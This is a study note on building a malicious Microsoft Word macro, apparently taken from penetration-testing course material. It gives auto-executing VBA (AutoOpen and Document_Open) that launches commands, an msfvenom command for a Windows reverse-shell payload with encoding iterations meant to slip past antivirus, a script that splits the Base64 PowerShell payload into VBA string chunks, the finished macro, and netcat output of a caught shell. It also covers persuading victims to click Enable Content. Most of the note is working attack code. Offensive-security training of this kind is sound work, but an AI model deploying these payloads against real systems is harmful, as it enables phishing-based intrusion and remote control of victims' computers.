## Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting
language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
Creating a Microsoft Word macro is as simple as choosing the VIEW ribbon and selecting Macros. We simply type a name for the macro and in the Macros in dropdown, select the name of the document the macro will be inserted into. When we click Create, a simple macro framework will be inserted into our document.

![[Pasted image 20230123001343.png]]

Let's examine our simple macro and discuss the fundamentals of VBA. The main procedure used in our VBA macro begins with the keyword Sub3 and ends with End Sub. This essentially marks the body of our macro. A Sub procedure is very similar to a Function in VBA. The difference lies in the fact that Sub procedures cannot be used in expressions because they do not return any values, whereas Functions do. At this point, our new macro, MyMacro() is simply an empty procedure and several lines beginning with an apostrophe, which marks the beginning of comments in VBA. 

```bas
Sub MyMacro()
'
' MyMacro Macro
'
'
End Sub
```
To invoke the Windows Scripting Host through ActiveX as we did earlier, we can use the CreateObject function along with the Wscript.Shell Run method. The code for that macro is shown below:

```bash
Sub MyMacro()

	CreateObject("Wscript.Shell").Run "cmd"

End Sub
```

Since Office macros are not executed automatically, we must make use of two predefined procedures, namely the AutoOpen procedure, which is executed when a new document is opened and the Document_Open procedure, which is executed when an already-open document is re-opened. Both of these procedures can call our custom procedure and therefore run our code.
```bash
Sub AutoOpen()

	MyMacro

End Sub

Sub Document_Open()

	MyMacro

End Sub

Sub MyMacro()

	CreateObject("Wscript.Shell").Run "cmd"

End Sub
```

We must save the containing document as either .docm or the older .doc format, which supports embedded macros, but must avoid the .docx format, which does not support them.
When we reopen the document containing our macro, we will be presented with a security warning, indicating that macros have been disabled. We must click Enable Content to run the macro. This is the default security setting of Microsoft Office and while it is possible to completely disable the use of macros to guard against this attack, they are often enabled as they are commonly used in most environments.

![[Pasted image 20230123001938.png]]

Once we press the Enable Content button, the macro will execute and a command prompt will open.
In the real world, if the victim does not click Enable Content, the attack will fail. To overcome this, the victim must be unaware of the potential consequences or be sufficiently encouraged by the presentation of the document to click this button.
As with the initial HTML Application, command execution is a start, but a reverse shell would be much better. To that end, we will turn to  PowerShell and use the ability to execute Metasploit shellcode using a Base64-encoded string with msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -i 7 -f hta-psh -o evil.hta
```

(-p) payload to be used is windows/shell_reverse_tcp, (-i) for iterations that msfvenom will do before create the payload, this could be helpful if an AV is in place, (-f) for hta-psh for the type of payload that the script will generate in this case is a VBA code.
In this case, we will only extract the string with the powershell payload:
```bash
cat evil.hta
<script language="VBScript">
	window.moveTo -4000, -4000
	Set aJhA3YP = CreateObject("Wscript.Shell")
	Set nMPTP = CreateObject("Scripting.FileSystemObject")
	For each path in
Split(aJhA3YP.ExpandEnvironmentStrings("%PSModulePath%"),";")
		If nMPTP.FileExists(path + "\..\powershell.exe") Then
			aJhA3YP.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQ
AnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBu
AHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8A
```

To make this happen, we will declare a variable (Dim6) of type String containing the PowerShell command we wish to execute. We will add a line to reserve space for our string variable in our macro:

```bash
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	
	CreateObject("Wscript.Shell").Run Str
End Sub
```

We could embed the base64-encoded PowerShell script as a single String, but VBA has a 255-character limit for literal strings. This restriction does not apply to strings stored in variables, so we can split the command into multiple lines and concatenate them.
We will use a simple Python script to split our command:

```python
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Having split the Base64 encoded string into smaller chunks, we can update our exploit as shown below.

```bash
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
	Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
	Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
	Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
	Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
	Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
...
	Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
	Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
	Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
	Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
	Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
	Str = Str + "QA="
	CreateObject("Wscript.Shell").Run Str
End Sub
```

Saving the Word document, closing it, and reopening it will automatically execute the macro. Notice that the macro security warning only re-appears if the name of the document is changed. If we launched a Netcat listener before opening the updated document, we would see that the macro works flawlessly:
```bash
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 59111
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Offsec>
```